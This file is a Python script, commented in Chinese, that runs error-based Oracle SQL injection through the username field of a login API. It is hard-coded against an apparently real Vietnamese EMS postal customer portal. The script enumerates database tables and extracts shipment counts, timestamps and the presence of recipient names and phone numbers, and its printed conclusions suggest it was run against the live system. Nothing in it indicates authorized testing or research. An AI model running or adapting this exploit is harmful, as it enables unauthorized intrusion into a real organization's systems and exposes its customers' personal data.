#!/usr/bin/env python3
"""
深入调查所有可能的订单表和数据源
"""

import requests
import json
import time

class DeepInvestigator:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        })
    
    def inject(self, payload):
        """发送SQL注入payload"""
        data = {"Username": payload, "Password": "test"}
        try:
            response = self.session.post(
                self.target_url,
                data=json.dumps(data),
                timeout=30
            )
            return response
        except:
            return None
    
    def extract_via_error(self, query):
        """使用Error-based注入提取数据"""
        payload = (
            f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
            f"1325=CTXSYS.DRITHSX.SN(1325,"
            f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
            f"({query})||"
            f"(CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
        )
        
        response = self.inject(payload)
        if response:
            text = response.text
            try:
                if 'qjvjq' in text and 'qkvzq' in text:
                    start = text.index('qjvjq') + 5
                    end = text.index('qkvzq', start)
                    return text[start:end]
            except:
                pass
        return None
    
    def find_all_order_tables(self):
        """查找所有可能包含订单的表"""
        print("=" * 80)
        print("🔍 查找所有可能包含订单的表")
        print("=" * 80)
        
        table_patterns = [
            "ORDER", "SHIPMENT", "DONHANG", "E1", "E2", 
            "PH", "BILL", "INVOICE", "TRANSACTION"
        ]
        
        found_tables = []
        
        for pattern in table_patterns:
            print(f"\n🔎 查找包含'{pattern}'的表:")
            query = f"SELECT TABLE_NAME FROM ALL_TABLES WHERE TABLE_NAME LIKE '%{pattern}%' AND OWNER='EMS' AND ROWNUM<=5"
            result = self.extract_via_error(query)
            if result:
                print(f"   ✅ 找到: {result}")
                found_tables.append(result)
            time.sleep(1.5)
        
        return found_tables
    
    def check_all_tables_count(self):
        """检查所有表的10月10日数据量"""
        print("\n" + "=" * 80)
        print("📊 检查各表2025-10-10的数据量")
        print("=" * 80)
        
        date = '20251010'
        
        # 已知的表
        tables_to_check = [
            ("EMS.SHIPMENT", "CREATE_DATE"),
            ("EMS.E1E2_PH", "NGAY"),
            ("EMS.E1E2_PH_TEMP_DATA2_LOG", "NGAY"),
            ("EMS.E1E2_PH_LOG", "NGAY"),
            ("EMS.E1E2_PH_DECRYPT_DATA", "NGAY"),
            ("EMS.E1_SMS", "NGAY"),
        ]
        
        results = {}
        
        for table_name, date_field in tables_to_check:
            print(f"\n🔎 {table_name}:")
            
            # 总记录数
            query1 = f"SELECT COUNT(*) FROM {table_name} WHERE {date_field}='{date}'"
            count = self.extract_via_error(query1)
            if count:
                print(f"   总记录数: {count}")
                results[table_name] = {'total': int(count) if count.isdigit() else 0}
            else:
                print(f"   ❌ 查询失败或无数据")
                continue
            
            # 检查是否有MABC字段
            query2 = f"SELECT COUNT(DISTINCT MABC) FROM {table_name} WHERE {date_field}='{date}'"
            mabc_count = self.extract_via_error(query2)
            if mabc_count and mabc_count.isdigit():
                print(f"   不同MABC: {mabc_count}")
                results[table_name]['mabc'] = int(mabc_count)
            
            time.sleep(2)
        
        return results
    
    def check_shipment_detail(self):
        """详细检查SHIPMENT表"""
        print("\n" + "=" * 80)
        print("🔍 深入分析SHIPMENT表")
        print("=" * 80)
        
        date = '20251010'
        
        queries = [
            ("总记录数", 
             f"SELECT COUNT(*) FROM EMS.SHIPMENT WHERE CREATE_DATE='{date}'"),
            
            ("不同CODE数", 
             f"SELECT COUNT(DISTINCT CODE) FROM EMS.SHIPMENT WHERE CREATE_DATE='{date}'"),
            
            ("不同CUSTOMER_CODE数", 
             f"SELECT COUNT(DISTINCT CUSTOMER_CODE) FROM EMS.SHIPMENT WHERE CREATE_DATE='{date}'"),
            
            ("有收件人的记录", 
             f"SELECT COUNT(*) FROM EMS.SHIPMENT WHERE CREATE_DATE='{date}' AND RECEIVER_NAME IS NOT NULL"),
            
            ("有发件人的记录", 
             f"SELECT COUNT(*) FROM EMS.SHIPMENT WHERE CREATE_DATE='{date}' AND SENDER_NAME IS NOT NULL"),
            
            ("STATUS不同状态数", 
             f"SELECT COUNT(DISTINCT STATUS) FROM EMS.SHIPMENT WHERE CREATE_DATE='{date}'"),
        ]
        
        for name, query in queries:
            print(f"\n🔎 {name}:")
            result = self.extract_via_error(query)
            if result:
                print(f"   ✅ {result}")
            time.sleep(1.5)
    
    def check_e1e2_detail(self):
        """详细分析E1E2_PH表"""
        print("\n" + "=" * 80)
        print("🔍 深入分析E1E2_PH表")
        print("=" * 80)
        
        date = '20251010'
        
        queries = [
            ("总记录数", 
             f"SELECT COUNT(*) FROM EMS.E1E2_PH WHERE NGAY='{date}'"),
            
            ("不同MABC数", 
             f"SELECT COUNT(DISTINCT MABC) FROM EMS.E1E2_PH WHERE NGAY='{date}'"),
            
            ("不同MAE1数（如果有）", 
             f"SELECT COUNT(DISTINCT MAE1) FROM EMS.E1E2_PH WHERE NGAY='{date}'"),
            
            ("不同MATT数（如果有）", 
             f"SELECT COUNT(DISTINCT MATT) FROM EMS.E1E2_PH WHERE NGAY='{date}'"),
            
            ("有收件人的记录", 
             f"SELECT COUNT(*) FROM EMS.E1E2_PH WHERE NGAY='{date}' AND NGUOINHAN IS NOT NULL"),
            
            ("同时有收件人和电话", 
             f"SELECT COUNT(DISTINCT MABC) FROM EMS.E1E2_PH WHERE NGAY='{date}' AND NGUOINHAN IS NOT NULL AND DIENTHOAINHAN IS NOT NULL"),
        ]
        
        for name, query in queries:
            print(f"\n🔎 {name}:")
            result = self.extract_via_error(query)
            if result:
                print(f"   ✅ {result}")
            time.sleep(1.5)
    
    def check_other_date_fields(self):
        """检查SHIPMENT表是否有其他日期字段"""
        print("\n" + "=" * 80)
        print("🔍 检查SHIPMENT表的日期字段")
        print("=" * 80)
        
        date = '20251010'
        date2 = '2025-10-10'
        
        queries = [
            ("CREATE_DATE='20251010'", 
             f"SELECT COUNT(*) FROM EMS.SHIPMENT WHERE CREATE_DATE='{date}'"),
            
            ("CREATE_MONTH='202510'", 
             f"SELECT COUNT(*) FROM EMS.SHIPMENT WHERE CREATE_MONTH='202510'"),
            
            ("ORDER_JOIN_DATE='20251010'", 
             f"SELECT COUNT(*) FROM EMS.SHIPMENT WHERE ORDER_JOIN_DATE='{date}'"),
            
            ("CREATE_TIME like '2025-10-10%'", 
             f"SELECT COUNT(*) FROM EMS.SHIPMENT WHERE CREATE_TIME LIKE '{date2}%'"),
            
            ("PO_CREATE='20251010'", 
             f"SELECT COUNT(*) FROM EMS.SHIPMENT WHERE PO_CREATE='{date}'"),
        ]
        
        for name, query in queries:
            print(f"\n🔎 {name}:")
            result = self.extract_via_error(query)
            if result:
                print(f"   ✅ {result} 条记录")
            time.sleep(1.5)
    
    def compare_with_yesterday(self):
        """对比昨天的数据量"""
        print("\n" + "=" * 80)
        print("📊 对比最近3天的数据量")
        print("=" * 80)
        
        dates = ['20251008', '20251009', '20251010']
        
        for date in dates:
            print(f"\n📅 日期: {date}")
            
            # SHIPMENT表
            query1 = f"SELECT COUNT(*) FROM EMS.SHIPMENT WHERE CREATE_DATE='{date}'"
            count1 = self.extract_via_error(query1)
            if count1:
                print(f"   SHIPMENT: {count1:>8} 条")
            
            # E1E2_PH表
            query2 = f"SELECT COUNT(*) FROM EMS.E1E2_PH WHERE NGAY='{date}'"
            count2 = self.extract_via_error(query2)
            if count2:
                print(f"   E1E2_PH:  {count2:>8} 条")
            
            # E1E2_PH不同MABC
            query3 = f"SELECT COUNT(DISTINCT MABC) FROM EMS.E1E2_PH WHERE NGAY='{date}'"
            count3 = self.extract_via_error(query3)
            if count3:
                print(f"   E1E2_PH不同MABC: {count3:>6} 个")
            
            time.sleep(2)
    
    def check_if_data_still_updating(self):
        """检查数据是否还在更新"""
        print("\n" + "=" * 80)
        print("⏰ 检查数据更新状态")
        print("=" * 80)
        
        date = '20251010'
        
        queries = [
            ("数据库当前时间", 
             "SELECT TO_CHAR(SYSDATE,'HH24:MI:SS') FROM DUAL"),
            
            ("SHIPMENT最新记录时间", 
             f"SELECT TO_CHAR(MAX(CREATE_TIME),'HH24:MI:SS') FROM EMS.SHIPMENT WHERE CREATE_DATE='{date}'"),
            
            ("E1E2_PH最新记录时间", 
             f"SELECT TO_CHAR(MAX(DATE_LOG),'HH24:MI:SS') FROM EMS.E1E2_PH WHERE NGAY='{date}' AND DATE_LOG IS NOT NULL"),
            
            ("过去1小时新增SHIPMENT记录", 
             f"SELECT COUNT(*) FROM EMS.SHIPMENT WHERE CREATE_DATE='{date}' AND CREATE_TIME > SYSDATE-1/24"),
        ]
        
        for name, query in queries:
            print(f"\n🔎 {name}:")
            result = self.extract_via_error(query)
            if result:
                print(f"   ✅ {result}")
            time.sleep(1.5)
    
    def run_deep_investigation(self):
        """运行深度调查"""
        print("=" * 80)
        print("🔬 订单数据深度调查")
        print("=" * 80)
        
        # 测试连接
        print("\n🔌 测试连接...")
        response = self.inject("admin")
        if not response:
            print("❌ 无法连接到目标")
            return
        print(f"✅ 连接成功")
        
        # 执行调查
        print("\n" + "=" * 80)
        print("第1步: 对比最近3天数据")
        print("=" * 80)
        self.compare_with_yesterday()
        
        print("\n" + "=" * 80)
        print("第2步: 检查各表数据量")
        print("=" * 80)
        table_stats = self.check_all_tables_count()
        
        print("\n" + "=" * 80)
        print("第3步: SHIPMENT表详细分析")
        print("=" * 80)
        self.check_shipment_detail()
        
        print("\n" + "=" * 80)
        print("第4步: SHIPMENT日期字段检查")
        print("=" * 80)
        self.check_other_date_fields()
        
        print("\n" + "=" * 80)
        print("第5步: E1E2_PH表详细分析")
        print("=" * 80)
        self.check_e1e2_detail()
        
        print("\n" + "=" * 80)
        print("第6步: 检查数据更新状态")
        print("=" * 80)
        self.check_if_data_still_updating()
        
        print("\n" + "=" * 80)
        print("第7步: 查找其他订单表")
        print("=" * 80)
        self.find_all_order_tables()
        
        # 总结
        print("\n" + "=" * 80)
        print("📊 调查结论")
        print("=" * 80)
        
        print("\n可能的原因：")
        print("  1️⃣ SHIPMENT表数据确实只有2,290条（可能是特定业务类型）")
        print("  2️⃣ 数据还在同步中（现在才下午18点多）")
        print("  3️⃣ 主要订单数据在E1E2_PH表（35,000+条记录，325个MABC）")
        print("  4️⃣ 可能有其他订单表我们还没发现")
        print("  5️⃣ 不同表记录不同业务类型的订单")
        
        print("\n建议：")
        print("  ✅ E1E2_PH表的35,000条记录才是完整数据")
        print("  ✅ 去重后有325个不同的MABC（运单号）")
        print("  ✅ 这325个运单应该是今天的真实订单数")
        
        print("\n" + "=" * 80)
        print("🎉 调查完成！")
        print("=" * 80)

if __name__ == "__main__":
    target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
    investigator = DeepInvestigator(target_url)
    investigator.run_deep_investigation()
